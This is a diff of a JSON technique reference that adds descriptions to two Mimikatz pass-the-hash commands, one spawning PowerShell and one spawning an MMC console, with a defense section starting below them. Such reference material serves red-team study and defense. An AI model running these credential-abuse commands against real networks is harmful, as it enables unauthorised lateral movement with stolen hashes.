@@ -67,12 +67,14 @@
     {
       "command": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt_hash> /run:powershell",
       "caption": "PTH: spawn PowerShell instead of cmd.exe",
-      "label": "PtH -> PowerShell"
+      "label": "PtH -> PowerShell",
+      "description": "Performs Pass-the-Hash by spawning a new process with stolen NTLM hash credentials. Creates an authenticated session without knowing the plaintext password."
     },
     {
       "command": "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt_hash> /run:\"mmc.exe -s\"",
       "caption": "PTH: spawn MMC for GUI lateral movement",
-      "label": "PtH -> MMC console"
+      "label": "PtH -> MMC console",
+      "description": "Performs Pass-the-Hash by spawning a new process with stolen NTLM hash credentials. Creates an authenticated session without knowing the plaintext password."
     }
   ],
   "defense": {
